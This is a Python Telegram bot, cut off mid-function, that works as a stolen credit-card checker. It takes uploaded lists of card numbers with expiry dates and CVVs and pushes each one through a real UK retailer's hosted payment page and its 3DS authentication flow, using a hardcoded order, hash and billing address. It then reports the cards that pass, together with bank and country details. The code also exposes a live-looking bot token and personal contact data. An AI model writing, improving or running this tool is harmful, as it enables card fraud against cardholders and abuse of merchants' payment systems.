import os
import asyncio
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
import requests
from bs4 import BeautifulSoup
import json
import time
import re

# ========== CONFIGURATION ==========
BOT_TOKEN = "7458997340:AAEKGFvkALm5usoFBvKdbGEs4b2dz5iSwtw"
ADMIN_IDS = [5895491379, 844663875]

# ========== MULTI-USER STATS ==========
user_sessions = {}  # {user_id: {stats}}

def get_user_stats(user_id):
    """Get or create user statistics"""
    if user_id not in user_sessions:
        user_sessions[user_id] = {
            'total': 0,
            'checking': 0,
            'success_3ds': 0,
            'otp_failed': 0,  # NEW: Cards with 3DS success but OTP delivery failed
            'failed': 0,
            'errors': 0,
            'start_time': None,
            'is_running': False,
            'dashboard_message_id': None,
            'chat_id': None,
            'current_card': '',
            'last_response': 'Waiting...',
            'cards_checked': 0,
            'success_cards': [],
            'otp_failed_cards': [],  # NEW: Store OTP failed cards
            'check_mode': 'basic',
        }
    return user_sessions[user_id]

def reset_user_stats(user_id):
    """Reset user statistics"""
    if user_id in user_sessions:
        user_sessions[user_id].update({
            'total': 0,
            'checking': 0,
            'success_3ds': 0,
            'otp_failed': 0,
            'failed': 0,
            'errors': 0,
            'start_time': None,
            'is_running': False,
            'current_card': '',
            'last_response': 'Waiting...',
            'cards_checked': 0,
            'success_cards': [],
            'otp_failed_cards': [],
        })

# ========== BIN LOOKUP ==========
def get_bin_info(card_number):
    """Get card BIN information"""
    try:
        bin_number = card_number[:6]
        response = requests.get(f"https://lookup.binlist.net/{bin_number}", timeout=5)
        
        if response.status_code == 200:
            data = response.json()
            
            card_type = data.get('type', 'Unknown').upper()
            card_brand = data.get('scheme', 'Unknown').upper()
            bank_name = data.get('bank', {}).get('name', 'Unknown')
            country_name = data.get('country', {}).get('name', 'Unknown')
            country_emoji = data.get('country', {}).get('emoji', '🌍')
            
            return {
                'type': card_type,
                'brand': card_brand,
                'bank': bank_name,
                'country': country_name,
                'emoji': country_emoji,
                'bin': bin_number
            }
    except:
        pass
    
    return {
        'type': 'UNKNOWN',
        'brand': 'UNKNOWN',
        'bank': 'Unknown Bank',
        'country': 'Unknown',
        'emoji': '🌍',
        'bin': card_number[:6]
    }

# ========== Card Checker Class ==========
class CardChecker:
    def __init__(self, check_mode='basic'):
        self.session = requests.Session()
        self.check_mode = check_mode
    
    def analyze_3ds_response(self, html_content):
        """
        COMPREHENSIVE 3DS Response Analysis
        Returns: (success_status, category, message)
        - success_status: True (OTP sent), False (OTP failed), None (unclear)
        - category: 'OTP_SUCCESS', 'OTP_FAILED', 'UNCLEAR'
        """
        try:
            soup = BeautifulSoup(html_content, 'html.parser')
            text_content = soup.get_text().lower()
            
            # ========== CRITICAL FAILURE PATTERNS (OTP FAILED) ==========
            critical_failures = [
                # Transaction errors
                (r"can'?t\s+complete\s+this\s+transaction", "Transaction cannot be completed"),
                (r"cannot\s+complete\s+this\s+transaction", "Transaction cannot be completed"),
                (r"unable\s+to\s+complete", "Unable to complete transaction"),
                (r"transaction\s+(was\s+)?declined", "Transaction declined"),
                (r"payment\s+(was\s+)?declined", "Payment declined"),
                
                # Card issues
                (r"card\s+(was\s+)?declined", "Card declined"),
                (r"card\s+not\s+supported", "Card not supported"),
                (r"invalid\s+card", "Invalid card"),
                (r"card\s+expired", "Card expired"),
                (r"expired\s+card", "Card has expired"),
                
                # CVV/Security issues
                (r"invalid\s+cvv", "Invalid CVV"),
                (r"incorrect\s+cvv", "Incorrect CVV code"),
                (r"wrong\s+security\s+code", "Wrong security code"),
                
                # Funds issues
                (r"insufficient\s+funds", "Insufficient funds"),
                (r"not\s+enough\s+funds", "Not enough funds"),
                (r"balance\s+too\s+low", "Balance too low"),
                
                # Processing errors
                (r"error\s+processing\s+(your\s+)?payment", "Error processing payment"),
                (r"payment\s+processing\s+error", "Payment processing error"),
                (r"processing\s+failed", "Processing failed"),
                (r"transaction\s+failed", "Transaction failed"),
                
                # Generic errors
                (r"sorry,?\s+something\s+went\s+wrong", "Something went wrong"),
                (r"an\s+error\s+occurred", "An error occurred"),
                (r"technical\s+error", "Technical error"),
                (r"system\s+error", "System error"),
                (r"try\s+again\s+later", "Service unavailable"),
                
                # Authentication failures
                (r"authentication\s+failed", "Authentication failed"),
                (r"verification\s+failed", "Verification failed"),
                (r"could\s+not\s+verify", "Could not verify card"),
                
                # Bank/Issuer issues
                (r"contact\s+(your\s+)?bank", "Contact your bank"),
                (r"issuer\s+declined", "Issuer declined"),
                (r"bank\s+declined", "Bank declined"),
                (r"not\s+authorized", "Not authorized by bank"),
                
                # Limit issues
                (r"limit\s+exceeded", "Limit exceeded"),
                (r"exceeds\s+(card\s+)?limit", "Exceeds card limit"),
                (r"over\s+limit", "Over limit"),
                
                # Geographic restrictions
                (r"not\s+available\s+in\s+(your\s+)?country", "Not available in your country"),
                (r"geographic\s+restriction", "Geographic restriction"),
                (r"region\s+not\s+supported", "Region not supported"),
            ]
            
            for pattern, message in critical_failures:
                if re.search(pattern, text_content, re.IGNORECASE):
                    return False, 'OTP_FAILED', f"❌ {message}"
            
            # ========== SUCCESS PATTERNS (OTP SENT) ==========
            success_patterns = [
                # Code entry requests
                (r"enter\s+(the\s+)?code", "Enter verification code"),
                (r"enter\s+(your\s+)?secure\s+code", "Enter secure code"),
                (r"enter\s+(the\s+)?\d+[\s-]?digit\s+code", "Enter digit code"),
                (r"type\s+(the\s+)?code", "Type the code"),
                (r"input\s+(the\s+)?code", "Input verification code"),
                (r"provide\s+(the\s+)?code", "Provide the code"),
                
                # Code sent confirmations
                (r"verification\s+code\s+(has\s+been\s+)?sent", "✅ Verification code sent"),
                (r"code\s+(has\s+been\s+)?sent", "✅ Code sent successfully"),
                (r"we'?ve?\s+sent\s+(a\s+)?code", "✅ Code sent to you"),
                (r"sent\s+(you\s+)?a\s+code", "✅ Code delivered"),
                (r"code\s+sent\s+to", "✅ Code sent to device"),
                
                # Check device instructions
                (r"check\s+your\s+phone", "✅ Check your phone"),
                (r"check\s+your\s+(mobile\s+)?device", "✅ Check your device"),
                (r"check\s+your\s+email", "✅ Check your email"),
                (r"check\s+your\s+(text\s+)?messages", "✅ Check your messages"),
                (r"look\s+for\s+(a\s+)?code", "✅ Look for code"),
                
                # Authentication requests
                (r"authentication\s+code", "Enter authentication code"),
                (r"security\s+code", "Enter security code"),
                (r"confirm\s+(your\s+)?identity", "Confirm your identity"),
                (r"verify\s+(your\s+)?identity", "Verify identity"),
                (r"additional\s+verification", "Additional verification required"),
                
                # OTP specific
                (r"one[\s-]?time\s+password", "OTP required"),
                (r"otp\s+code", "OTP code required"),
                (r"enter\s+otp", "Enter OTP"),
                
                # SMS/Email references
                (r"sms\s+(code|message)", "✅ SMS code sent"),
                (r"text\s+message\s+code", "✅ Text message sent"),
                (r"email\s+(with\s+)?code", "✅ Email code sent"),
                
                # Challenge completion
                (r"complete\s+(the\s+)?verification", "Complete verification"),
                (r"finish\s+(the\s+)?authentication", "Finish authentication"),
                (r"continue\s+(with\s+)?verification", "Continue verification"),
            ]
            
            for pattern, message in success_patterns:
                if re.search(pattern, text_content, re.IGNORECASE):
                    return True, 'OTP_SUCCESS', f"✅ {message}"
            
            # ========== CHECK FOR INPUT FIELDS (OTP SUCCESS) ==========
            # Only check if no failure keywords found
            if not any(word in text_content for word in ['sorry', 'error', 'failed', 'declined', 'wrong']):
                input_fields = soup.find_all('input', {'type': ['text', 'tel', 'number']})
                
                for field in input_fields:
                    field_attrs = ' '.join([
                        field.get('name', ''),
                        field.get('id', ''),
                        field.get('placeholder', ''),
                        field.get('class', '') if isinstance(field.get('class'), str) else ' '.join(field.get('class', []))
                    ]).lower()
                    
                    otp_indicators = ['otp', 'code', 'verification', 'verify', 'secure', 'auth', 
                                     'text_input', 'text-input', 'challenge', 'pin']
                    
                    if any(indicator in field_attrs for indicator in otp_indicators):
                        return True, 'OTP_SUCCESS', "✅ OTP input field detected"
            
            # ========== CHECK FOR VERIFY BUTTONS (OTP SUCCESS) ==========
            verify_buttons = soup.find_all(['button', 'input'], {'type': ['submit', 'button']})
            for btn in verify_buttons:
                btn_text = ' '.join([
                    btn.get_text(),
                    btn.get('value', ''),
                    btn.get('id', ''),
                    btn.get('name', '')
                ]).lower()
                
                if any(word in btn_text for word in ['verify', 'submit', 'confirm', 'continue', 'next']):
                    if not any(word in text_content for word in ['sorry', 'error', 'failed']):
                        return True, 'OTP_SUCCESS', "✅ Verification form detected"
            
            # ========== AMBIGUOUS RESPONSES ==========
            if 'loading' in text_content or 'please wait' in text_content:
                return None, 'UNCLEAR', "⏳ Loading response"
            
            return None, 'UNCLEAR', "❓ Response unclear"
            
        except Exception as e:
            return None, 'UNCLEAR', f"⚠️ Analysis error: {str(e)[:30]}"
        
    def check(self, card_line):
        """Check a single card"""
        debug_log = []
        
        try:
            parts = card_line.strip().split('|')
            if len(parts) != 4:
                return "ERROR", "Invalid format", None
            
            ccnum, month, year, cvv = parts
            debug_log.append(f"Card: {ccnum[:6]}****{ccnum[-4:]}")
            debug_log.append(f"Check Mode: {self.check_mode}")
            
            # Step 1: Get GUID
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            }
            
            data = {
                'PAYER_EXIST': '0',
                'OFFER_SAVE_CARD': '1',
                'CARD_STORAGE_ENABLE': '1',
                'HPP_VERSION': '2',
                'MERCHANT_RESPONSE_URL': 'https://www.dobies.co.uk/realex/new-return.cfm',
                'NEWSYSTEM': '1',
                'RETURN_TSS': '1',
                'WEB_ORDER_ID': '23614795',
                'SITE': 'DESKTOP',
                'MERCHANT_ID': 'bvgairflo',
                'ORDER_ID': '11BDE712-C3E6-5F98-FBFAC4C6563D9ED3',
                'USER_ID': '5187113',
                'ACCOUNT': 'suttonsdobiesecomm',
                'AMOUNT': '1698',
                'CURRENCY': 'GBP',
                'TIMESTAMP': '20251114091142',
                'SHA1HASH': 'a275d57746de14eebd0810c6255e6a86b11ae0c3',
                'AUTO_SETTLE_FLAG': '1',
                'SHOP': 'www.dobies.co.uk',
                'SHOPREF': '112',
                'VAR_REF': '5187113',
                'HPP_CUSTOMER_EMAIL': 'renes98352@neuraxo.com',
                'HPP_BILLING_STREET1': '216 The Broadway',
                'HPP_BILLING_CITY': 'Birmingham',
                'HPP_BILLING_POSTALCODE': 'B203DL',
                'HPP_BILLING_COUNTRY': '826',
                'HPP_ADDRESS_MATCH_INDICATOR': 'TRUE',
                'HPP_CHALLENGE_REQUEST_INDICATOR': 'NO_PREFERENCE',
            }
            
            response = self.session.post('https://hpp.globaliris.com/pay', headers=headers, data=data, timeout=15)
            debug_log.append(f"Step 1: GUID Response Status: {response.status_code}")
            
            soup = BeautifulSoup(response.text, 'html.parser')
            guid_input = soup.find('input', {'name': 'guid'})
            if not guid_input:
                return "ERROR", "GUID not received", "\n".join(debug_log)
            
            guid = guid_input.get('value')
            debug_log.append(f"GUID: {guid[:20]}...")
            
            # Step 2: Load card page
            card_page_url = f"https://hpp.globaliris.com/hosted-payments/blue/card.html?guid={guid}"
            self.session.get(card_page_url, headers={'User-Agent': 'Mozilla/5.0'}, timeout=10)
            debug_log.append(f"Step 2: Card Page Loaded")
            
            # Step 3: Verify enrollment
            headers_xhr = {
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'X-Requested-With': 'XMLHttpRequest',
                'User-Agent': 'Mozilla/5.0',
                'Referer': card_page_url,
            }
            
            verify_data = {
                'pas_cctype': '',
                'pas_ccnum': ccnum,
                'pas_expiry': '',
                'pas_cccvc': '',
                'pas_ccname': '',
                'guid': guid,
            }
            
            verify_response = self.session.post(
                'https://hpp.globaliris.com/hosted-payments/blue/3ds2/verifyEnrolled',
                headers=headers_xhr,
                data=verify_data,
                timeout=15
            )
            
            debug_log.append(f"Step 3: Verify Response Status: {verify_response.status_code}")
            
            try:
                verify_result = verify_response.json()
            except:
                debug_log.append(f"Verify Response (not JSON): {verify_response.text[:200]}")
                return "ERROR", "Invalid verification response", "\n".join(debug_log)
            
            enrolled = verify_result.get('enrolled', False)
            debug_log.append(f"Enrolled: {enrolled}")
            
            if not enrolled:
                return "FAILED", "Not enrolled in 3DS", "\n".join(debug_log)
            
            method_url = verify_result.get('method_url')
            method_data = verify_result.get('method_data', {})
            
            # Step 4: Execute 3DS Method
            method_completion_indicator = 'U'
            
            if method_url and method_data:
                try:
                    encoded_method_data = method_data.get('encoded_method_data')
                    method_response = self.session.post(
                        method_url,
                        data={'threeDSMethodData': encoded_method_data},
                        headers={'Content-Type': 'application/x-www-form-urlencoded'},
                        timeout=10
                    )
                    if method_response.status_code == 200:
                        method_completion_indicator = 'Y'
                    else:
                        method_completion_indicator = 'N'
                    debug_log.append(f"Step 4: Method Status: {method_response.status_code}")
                except Exception as e:
                    method_completion_indicator = 'U'
                    debug_log.append(f"Step 4: Method Error: {str(e)[:50]}")
                
                time.sleep(2)
            
            # Step 5: Send card data
            full_card_data = {
                'pas_cctype': '',
                'verifyResult': json.dumps(verify_result),
                'verifyEnrolled': 'Y',
                'pas_ccnum': ccnum,
                'pas_expiry': f"{month}/{year[-2:]}",
                'pas_cccvc': cvv,
                'pas_ccname': 'TEST',
                'guid': guid,
                'browserJavaEnabled': 'false',
                'browserLanguage': 'en',
                'screenColorDepth': '24',
                'screenHeight': '1080',
                'screenWidth': '1920',
                'timezoneUtcOffset': '-120',
                'threeDSMethodCompletionInd': method_completion_indicator,
            }
            
            auth_response = self.session.post(
                'https://hpp.globaliris.com/hosted-payments/blue/api/auth',
                headers=headers_xhr,
                data=full_card_data,
                timeout=15
            )
            
            debug_log.append(f"Step 5: Auth Response Status: {auth_response.status_code}")
            
            content_type = auth_response.headers.get('Content-Type', '')
            
            if 'html' in content_type.lower() or auth_response.text.strip().startswith('<'):
                debug_log.append(f"HTML Response detected")
                if 'error processing your payment' in auth_response.text.lower():
                    return "FAILED", "Error processing payment", "\n".join(debug_log)
                return "ERROR", "Unexpected HTML response", "\n".join(debug_log)
            
            try:
                auth_result = auth_response.json()
            except json.JSONDecodeError:
                debug_log.append(f"Auth Response (not JSON): {auth_response.text[:300]}")
                return "ERROR", "Invalid response", "\n".join(debug_log)
            
            data_obj = auth_result.get('data', {})
            verify_enrolled_result = data_obj.get('verifyEnrolledResult', {})
            
            # Check for Challenge URL (3DS Success)
            challenge_url = None
            encoded_creq = None
            three_ds_session_data = None
            
            if verify_enrolled_result and verify_enrolled_result.get('challengeRequestUrl'):
                challenge_url = verify_enrolled_result.get('challengeRequestUrl', '')
                encoded_creq = verify_enrolled_result.get('encodedCreq', '')
                three_ds_session_data = verify_enrolled_result.get('threeDSSessionData', '')
                debug_log.append(f"✅ Challenge URL found - 3DS SUCCESS")
            elif verify_result.get('challenge_request_url'):
                challenge_url = verify_result.get('challenge_request_url', '')
                encoded_creq = verify_result.get('encoded_creq', '')
                three_ds_session_data = verify_result.get('three_ds_session_data', '')
                debug_log.append(f"✅ Challenge URL found - 3DS SUCCESS")
            
            # If Challenge URL found = Card passed 3DS
            if challenge_url and encoded_creq:
                debug_log.append(f"3DS Authentication Successful!")
                
                # Basic Mode: Direct success without additional checks
                if self.check_mode == 'basic':
                    return "SUCCESS", "3DS passed", "\n".join(debug_log)
                
                # Advanced Mode: Check OTP delivery status
                elif self.check_mode == 'advanced':
                    try:
                        challenge_headers = {
                            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                            'accept-language': 'en',
                            'content-type': 'application/x-www-form-urlencoded',
                            'origin': 'https://hpp.globaliris.com',
                            'referer': 'https://hpp.globaliris.com/',
                            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                        }
                        
                        challenge_data = {
                            'creq': encoded_creq,
                            'threeDSSessionData': three_ds_session_data,
                        }
                        
                        debug_log.append(f"Checking OTP delivery status...")
                        
                        challenge_response = self.session.post(
                            challenge_url,
                            headers=challenge_headers,
                            data=challenge_data,
                            timeout=15
                        )
                        
                        debug_log.append(f"Challenge Status: {challenge_response.status_code}")
                        
                        if challenge_response.status_code == 200:
                            otp_success, category, message = self.analyze_3ds_response(challenge_response.text)
                            
                            if otp_success:
                                # 3DS Success + OTP Sent = Full Success
                                return "SUCCESS", f"3DS passed | {message}", "\n".join(debug_log)
                            elif otp_success is False:
                                # 3DS Success but OTP Failed
                                return "OTP_FAILED", f"3DS passed but OTP failed | {message}", "\n".join(debug_log)
                            else:
                                # Unclear OTP status
                                return "SUCCESS", f"3DS passed | OTP status unclear", "\n".join(debug_log)
                        else:
                            return "SUCCESS", f"3DS passed | Could not verify OTP", "\n".join(debug_log)
                        
                    except Exception as e:
                        debug_log.append(f"Challenge check error: {str(e)}")
                        return "SUCCESS", f"3DS passed | OTP check failed", "\n".join(debug_log)
            
            # No Challenge URL found
            debug_log.append(f"No Challenge URL - checking auth status...")
            status = auth_result.get('status', 'unknown')
            result_code = data_obj.get('response', {}).get('result', status)
            
            debug_log.append(f"Final Status: {status}, Result Code: {result_code}")
            
            if status == 'success' or result_code == '00':
                return "SUCCESS", "3DS passed without challenge", "\n".join(debug_log)
            
            return "FAILED", f"Auth failed: {result_code}", "\n".join(debug_log)
                
        except requests.Timeout:
            return "ERROR", "Request timeout", "\n".join(debug_log)
        except requests.RequestException as e:
            debug_log.append(f"Request Error: {str(e)}")
            return "ERROR", str(e)[:30], "\n".join(debug_log)
        except Exception as e:
            debug_log.append(f"Exception: {str(e)}")
            return "ERROR", str(e)[:30], "\n".join(debug_log)

async def send_result(bot_app, card, status_type, message, debug_info, user_id):
    try:
        stats = get_user_stats(user_id)
        card_number = stats['success_3ds'] + stats['otp_failed'] + stats['failed']
        
        # Get BIN info for successful cards
        bin_info = get_bin_info(card.split('|')[0])
        
        if status_type == 'SUCCESS':
            mode_emoji = "🔍" if stats['check_mode'] == 'advanced' else "⚡"
            
            text = (
                "╔════════════════════════╗\n"
                f"✨ **3DS VERIFICATION PASSED** {mode_emoji}\n"
                "╚════════════════════════╝\n\n"
                f"💳 `{card}`\n\n"
                f"🏦 **Bank:** {bin_info['bank']}\n"
                f"🌍 **Country:** {bin_info['emoji']} {bin_info['country']}\n"
                f"💎 **Type:** {bin_info['type']} {bin_info['brand']}\n"
                f"🔢 **BIN:** `{bin_info['bin']}`\n\n"
                f"✅ **Status:** {message}\n"
                f"📊 **Card:** #{card_number}\n"
                "╚════════════════════════╝"
            )
            stats['success_cards'].append(f"{card} | {bin_info['bank']} | {bin_info['country']}")
            
            await bot_app.bot.send_message(
                chat_id=stats['chat_id'],
                text=text,
                parse_mode='Markdown'
            )
        
        elif status_type == 'OTP_FAILED':
            # NEW: Handle OTP Failed cards
            mode_emoji = "🔍"
            
            text = (
                "╔════════════════════════╗\n"
                f"⚠️ **3DS PASSED - OTP ISSUE** {mode_emoji}\n"
                "╚════════════════════════╝\n\n"
                f"💳 `{card}`\n\n"
                f"🏦 **Bank:** {bin_info['bank']}\n"
                f"🌍 **Country:** {bin_info['emoji']} {bin_info['country']}\n"
                f"💎 **Type:** {bin_info['type']} {bin_info['brand']}\n"
                f"🔢 **BIN:** `{bin_info['bin']}`\n\n"
                f"⚠️ **Status:** {message}\n"
                f"📊 **Card:** #{card_number}\n"
                "╚════════════════════════╝"
            )
            stats['otp_failed_cards'].append(f"{card} | {bin_info['bank']} | {message}")
            
            await bot_app.bot.send_message(
                chat_id=stats['chat_id'],
                text=text,
                parse_mode='Markdown'
            )
            
    except Exception as e:
        print(f"[!] Error: {e}")

async def check_card(card, bot_app, user_id):
    stats = get_user_stats(user_id)
    
    if not stats['is_running']:
        return card, "STOPPED", "Stopped by user"
    
    parts = card.strip().split('|')
    if len(parts) != 4:
        stats['errors'] += 1
        stats['checking'] -= 1
        stats['last_response'] = 'Format Error'
        await update_dashboard(bot_app, user_id)
        return card, "ERROR", "Invalid format"
    
    try:
        if not stats['is_running']:
            stats['checking'] -= 1
            return card, "STOPPED", "Stopped by user"
        
        checker = CardChecker(check_mode=stats['check_mode'])
        status, message, debug_info = checker.check(card)
        
        if status == 'SUCCESS':
            stats['success_3ds'] += 1
            stats['checking'] -= 1
            stats['last_response'] = '3DS Success ✅'
            await update_dashboard(bot_app, user_id)
            await send_result(bot_app, card, "SUCCESS", message, debug_info, user_id)
            return card, "SUCCESS", message
        
        elif status == 'OTP_FAILED':
            # NEW: Handle OTP Failed status
            stats['otp_failed'] += 1
            stats['checking'] -= 1
            stats['last_response'] = 'OTP Failed ⚠️'
            await update_dashboard(bot_app, user_id)
            await send_result(bot_app, card, "OTP_FAILED", message, debug_info, user_id)
            return card, "OTP_FAILED", message
            
        elif status == 'FAILED':
            stats['failed'] += 1
            stats['checking'] -= 1
            stats['last_response'] = 'Failed ❌'
            await update_dashboard(bot_app, user_id)
            return card, "FAILED", message
            
        else:
            stats['errors'] += 1
            stats['checking'] -= 1
            stats['last_response'] = f'Error: {message[:20]}'
            await update_dashboard(bot_app, user_id)
            return card, "ERROR", message
            
    except Exception as e:
        stats['errors'] += 1
        stats['checking'] -= 1
        stats['last_response'] = f'Error: {str(e)[:20]}'
        await update_dashboard(bot_app, user_id)
        return card, "EXCEPTION", str(e)

def create_dashboard_keyboard(user_id):
    stats = get_user_stats(user_id)
    elapsed = 0
    if stats['start_time']:
        elapsed = int((datetime.now() - stats['start_time']).total_seconds())
    mins, secs = divmod(elapsed, 60)
    hours, mins = divmod(mins, 60)
    
    mode_text = "🔍 Advanced" if stats['check_mode'] == 'advanced' else "⚡ Basic"
    
    keyboard = [
        [InlineKeyboardButton(f"🔥 Total: {stats['total']}", callback_data="total")],
        [
            InlineKeyboardButton(f"🔄 Checking: {stats['checking']}", callback_data="checking"),
            InlineKeyboardButton(f"⏱ {hours:02d}:{mins:02d}:{secs:02d}", callback_data="time")
        ],
        [
            InlineKeyboardButton(f"✅ 3DS Success: {stats['success_3ds']}", callback_data="success"),
            InlineKeyboardButton(f"⚠️ OTP Failed: {stats['otp_failed']}", callback_data="otp_failed")
        ],
        [
            InlineKeyboardButton(f"❌ Failed: {stats['failed']}", callback_data="failed"),
            InlineKeyboardButton(f"🚫 Errors: {stats['errors']}", callback_data="errors")
        ],
        [
            InlineKeyboardButton(f"📡 {stats['last_response']}", callback_data="response")
        ],
        [
            InlineKeyboardButton(f"Check Mode: {mode_text}", callback_data="mode_info")
        ]
    ]
    
    if stats['is_running']:
        keyboard.append([InlineKeyboardButton("🛑 Stop Checking", callback_data="stop_check")])
    
    if stats['current_card']:
        keyboard.append([InlineKeyboardButton(f"🔄 {stats['current_card']}", callback_data="current")])
    
    return InlineKeyboardMarkup(keyboard)

async def update_dashboard(bot_app, user_id):
    stats = get_user_stats(user_id)
    if stats['dashboard_message_id'] and stats['chat_id']:
        try:
            await bot_app.bot.edit_message_text(
                chat_id=stats['chat_id'],
                message_id=stats['dashboard_message_id'],
                text="📊 **3D SECURE CHECKER - LIVE DASHBOARD** 📊",
                reply_markup=create_dashboard_keyboard(user_id),
                parse_mode='Markdown'
            )
        except:
            pass

async def send_final_files(bot_app, user_id):
    stats = get_user_stats(user_id)
    try:
        # Send SUCCESS cards file
        if stats['success_cards']:
            success_text = "\n".join(stats['success_cards'])
            filename = f"3ds_success_{user_id}_{int(datetime.now().timestamp())}.txt"
            with open(filename, "w", encoding='utf-8') as f:
                f.write(success_text)
            await bot_app.bot.send_document(
                chat_id=stats['chat_id'],
                document=open(filename, "rb"),
                caption=f"✅ **3DS Success Cards** ({len(stats['success_cards'])} cards)",
                parse_mode='Markdown'
            )
            os.remove(filename)
        
        # Send OTP FAILED cards file (NEW)
        if stats['otp_failed_cards']:
            otp_failed_text = "\n".join(stats['otp_failed_cards'])
            filename = f"otp_failed_{user_id}_{int(datetime.now().timestamp())}.txt"
            with open(filename, "w", encoding='utf-8') as f:
                f.write(otp_failed_text)
            await bot_app.bot.send_document(
                chat_id=stats['chat_id'],
                document=open(filename, "rb"),
                caption=f"⚠️ **OTP Failed Cards** ({len(stats['otp_failed_cards'])} cards)\n3DS passed but OTP delivery issues",
                parse_mode='Markdown'
            )
            os.remove(filename)
        
    except Exception as e:
        print(f"[!] File sending error: {e}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ Unauthorized - This bot is private")
        return
    
    user_id = update.effective_user.id
    stats = get_user_stats(user_id)
    
    keyboard = [
        [InlineKeyboardButton("📁 Send Card File", callback_data="send_file")],
        [InlineKeyboardButton("⚙️ Select Check Mode", callback_data="select_mode")]
    ]
    
    await update.message.reply_text(
        "╔════════════════════════╗\n"
        "🚀 **3D SECURE CHECKER BOT** 🚀\n"
        "╚════════════════════════╝\n\n"
        "💼 **How to use:**\n"
        "Send a .txt file with cards\n"
        "Format: `number|month|year|cvv`\n\n"
        "🎯 **Check Modes:**\n"
        "⚡ **Basic Mode**: Fast 3DS check only\n"
        "🔍 **Advanced Mode**: 3DS + OTP delivery status\n\n"
        f"🔧 **Current Mode:** {'🔍 Advanced' if stats.get('check_mode') == 'advanced' else '⚡ Basic'}\n\n"
        "✨ **Features:**\n"
        "• Multi-user support\n"
        "• Real-time dashboard\n"
        "• BIN lookup (Bank, Country, Type)\n"
        "• OTP delivery verification\n"
        "• Comprehensive error detection\n\n"
        "👥 Multiple users can check simultaneously!",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ Unauthorized")
        return
    
    user_id = update.effective_user.id
    stats = get_user_stats(user_id)
    
    if stats['is_running']:
        await update.message.reply_text("⚠️ You already have an active check! Complete or stop it first.")
        return
    
    file = await update.message.document.get_file()
    file_content = await file.download_as_bytearray()
    cards = [c.strip() for c in file_content.decode('utf-8').strip().split('\n') if c.strip()]
    
    # Reset stats for user
    stats.update({
        'total': len(cards),
        'checking': 0,
        'success_3ds': 0,
        'otp_failed': 0,
        'failed': 0,
        'errors': 0,
        'current_card': '',
        'last_response': 'Starting...',
        'cards_checked': 0,
        'success_cards': [],
        'otp_failed_cards': [],
        'start_time': datetime.now(),
        'is_running': True,
        'chat_id': update.effective_chat.id
    })
    
    dashboard_msg = await update.message.reply_text(
        text="📊 **3D SECURE CHECKER - LIVE DASHBOARD** 📊",
        reply_markup=create_dashboard_keyboard(user_id),
        parse_mode='Markdown'
    )
    stats['dashboard_message_id'] = dashboard_msg.message_id
    
    mode_text = "🔍 Advanced (with OTP check)" if stats['check_mode'] == 'advanced' else "⚡ Basic (3DS only)"
    
    await update.message.reply_text(
        f"╔════════════════════════╗\n"
        f"✅ **CHECK STARTED!** ✅\n"
        f"╚════════════════════════╝\n\n"
        f"📊 **Total Cards:** {len(cards)}\n"
        f"🔄 **Mode:** {mode_text}\n"
        f"⏳ **Status:** Processing...\n\n"
        f"💡 Watch the live dashboard above!",
        parse_mode='Markdown'
    )
    
    asyncio.create_task(process_cards(cards, context.application, user_id))

async def process_cards(cards, bot_app, user_id):
    stats = get_user_stats(user_id)
    
    for i, card in enumerate(cards):
        if not stats['is_running']:
            stats['last_response'] = 'Stopped by user 🛑'
            await update_dashboard(bot_app, user_id)
            break
        
        stats['checking'] = 1
        parts = card.split('|')
        stats['current_card'] = f"{parts[0][:6]}****{parts[0][-4:]}" if len(parts) > 0 else card[:10]
        await update_dashboard(bot_app, user_id)
        
        await check_card(card, bot_app, user_id)
        stats['cards_checked'] += 1
        
        if stats['cards_checked'] % 5 == 0:
            await update_dashboard(bot_app, user_id)
        
        await asyncio.sleep(2)
    
    stats['is_running'] = False
    stats['checking'] = 0
    stats['current_card'] = ''
    stats['last_response'] = 'Completed ✅'
    await update_dashboard(bot_app, user_id)
    
    mode_text = "🔍 Advanced" if stats['check_mode'] == 'advanced' else "⚡ Basic"
    
    summary_text = (
        "╔════════════════════════╗\n"
        "🎉 **CHECK COMPLETED!** 🎉\n"
        "╚════════════════════════╝\n\n"
        f"📊 **Final Statistics:**\n\n"
        f"🔥 Total Checked: **{stats['total']}**\n"
        f"✅ 3DS Success: **{stats['success_3ds']}**\n"
        f"⚠️ OTP Failed: **{stats['otp_failed']}**\n"
        f"❌ Failed: **{stats['failed']}**\n"
        f"🚫 Errors: **{stats['errors']}**\n\n"
        f"🔧 Mode: **{mode_text}**\n\n"
        "📁 **Sending result files...**"
    )
    
    await bot_app.bot.send_message(
        chat_id=stats['chat_id'],
        text=summary_text,
        parse_mode='Markdown'
    )
    
    await send_final_files(bot_app, user_id)
    
    final_text = (
        "╔════════════════════════╗\n"
        "✨ **ALL DONE!** ✨\n"
        "╚════════════════════════╝\n\n"
        "✅ All files have been sent\n"
        "📊 Thank you for using the bot!\n\n"
        "⚡️ Powered by 3D Secure Gateway\n"
        "🔒 Secure • Fast • Reliable"
    )
    
    await bot_app.bot.send_message(
        chat_id=stats['chat_id'],
        text=final_text,
        parse_mode='Markdown'
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ Unauthorized - This bot is private")
        return

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    
    if query.from_user.id not in ADMIN_IDS:
        await query.answer("❌ Unauthorized", show_alert=True)
        return
    
    user_id = query.from_user.id
    stats = get_user_stats(user_id)
    
    try:
        await query.answer()
    except:
        pass
    
    if query.data == "stop_check":
        if stats['is_running']:
            stats['is_running'] = False
            stats['checking'] = 0
            stats['last_response'] = 'Stopped 🛑'
            await update_dashboard(context.application, user_id)
            try:
